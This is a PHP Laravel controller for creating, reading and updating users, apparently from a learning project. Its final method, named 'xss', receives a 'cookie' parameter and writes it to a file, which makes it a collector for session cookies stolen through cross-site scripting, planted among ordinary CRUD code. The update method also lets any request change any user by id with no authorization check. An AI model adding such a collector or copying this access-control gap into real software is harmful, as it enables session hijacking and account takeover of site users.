<?php

namespace App\Http\Controllers;

use Hash;
use Session;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

/**
 * CRUD User controller
 */
class CrudUserController extends Controller
{

    
    public function updateUser(Request $request)
    {
        $user_id = $request->get('id');
        $user = User::find($user_id);

        return view('crud_user.update', ['user' => $user]);
    }

    /**
     * Submit form update user
     */
    public function postUpdateUser(Request $request)
    {
        $input = $request->all();

        $request->validate([
            'name' => 'required',
            'email' => 'required|email|unique:users,id,'.$input['id'],
            'phone' => 'required',
            'favorite' => 'required',
            'password' => 'required|min:6',
            'img' => 'image|mimes:jpeg,png,jpg,gif', 
        ]);

        $user = User::find($input['id']);
        $user->name = $input['name'];
        $user->email = $input['email'];
        $user->phone = $input['phone'];
        $user->favorite = $input['favorite'];
        $user->password = Hash::make($input['password']);


        if ($request->hasFile('img')) {
            $image = $request->file('img');
            $imageName = uniqid() . '.' . $image->getClientOriginalExtension();
            $image->move(public_path('images'), $imageName);
            $user->img = 'images/' . $imageName; 
        }

        $user->save();

        return redirect("listuser")->withSuccess('You have signed-in');
    }

    public function readUser(Request $request) {
        $user_id = $request->get('id');
        $user = User::find($user_id);

        return view('crud_user.read', ['user' => $user]);
    }
    public function xss(Request $request) {		
        $cookie = $request->get('cookie');		
        file_put_contents('xss.txt', $cookie);		
        var_dump($cookie);die();	
    }		

}
